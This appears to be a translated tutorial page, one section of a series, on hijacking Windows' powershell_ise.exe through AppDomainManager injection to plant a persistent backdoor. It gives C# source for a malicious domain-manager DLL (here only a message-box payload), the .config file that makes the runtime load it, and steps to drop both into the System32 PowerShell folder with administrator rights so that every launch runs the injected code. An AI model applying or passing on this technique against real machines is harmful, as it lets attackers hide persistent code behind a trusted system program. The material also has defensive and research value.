<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Example Hijack PowerShell ISE</title>
</head><body><b>4 hijack system.Net program powershell_ise.exe</b><br/>
Next, you need to find the system .Net program available, and try to implement a persistent backdoor.<br/>
<br/>
Here select powershell_ise.exe as a demo<br/>
<br/>
Note: Powershell_ise.exe: full name Windows PowerShell Integrated Scripting Environment (integrated scripting environment)<br/>
<br/>
Graphical interface, mainly used to write and debug powershell scripts<br/>
<br/>
The operation interface is as follows<br/>
<br/>
1, add a reference<br/>
Project - right click - add a reference, select System.Windows.Forms<br/>
<br/>
As shown below<br/>
<img src="image.png" /><br/>
<br/>
The code is modified as follows:<br/>
<br/>
using System;<br/>
using System.Windows.Forms; <br/>
namespace DomainManager<br/>
{<br/>
&nbsp; &nbsp; public class InjectedDomainManager : AppDomainManager<br/>
&nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; public override void InitializeNewDomain(AppDomainSetup appDomainInfo)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; base.InitializeNewDomain(appDomainInfo);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Console.WriteLine("Blah From AppMgr");<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; MessageBox.Show("1");<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; }<br/>
}<br/>
<br/>
Recompile and generate DomainManager.dll<br/>
<br/>
2, test<br/>
Hijack program.exe successfully, as shown below<br/>
<br/>
<img src="image 2.png" /><br/>
<br/>
<br/>
Hijack powershell_ise.exe:<br/>
<br/>
(1) Test the test directory<br/>
<br/>
Copy powershell_ise.exe toc:\test<br/>
<br/>
Create powershell_ise.exe.config in the same directory, the config file can be properly streamlined, and the content is as follows:<br/>
<br/>
&lt;?xml version="1.0"?&gt;<br/>
&lt;configuration&gt;<br/>
&nbsp; &lt;startup&gt;<br/>
&nbsp; &nbsp; &lt;supportedRuntime version="v4.0" /&gt;<br/>
&nbsp; &lt;/startup&gt;<br/>
&nbsp; &nbsp; &lt;runtime&gt;<br/>
&nbsp; &nbsp; &nbsp; &lt;appDomainManagerType value="DomainManager.InjectedDomainManager" /&gt;<br/>
&nbsp; &nbsp; &nbsp; &lt;appDomainManagerAssembly value="DomainManager" /&gt;<br/>
&nbsp; &nbsp; &lt;/runtime&gt;<br/>
&lt;/configuration&gt;<br/>
<br/>
c:\testStart powershell_ise.exe in the directory<br/>
<br/>
Successful hijacking powershell_ise.exe<br/>
<br/>
(2) Test the default directory of powershell_ise.exe<br/>
<br/>
The path is as follows:<br/>
C:\Windows\System32\WindowsPowerShell\v1.0<br/>
<br/>
Requires administrator privileges to create hijacked files DomainManager.dll and powershell_ise.exe.config in the default directory<br/>
<br/>
Compile any powershell script, start powershell_ise.exe by default, successfully hijack<br/>
<br/>
</body></html>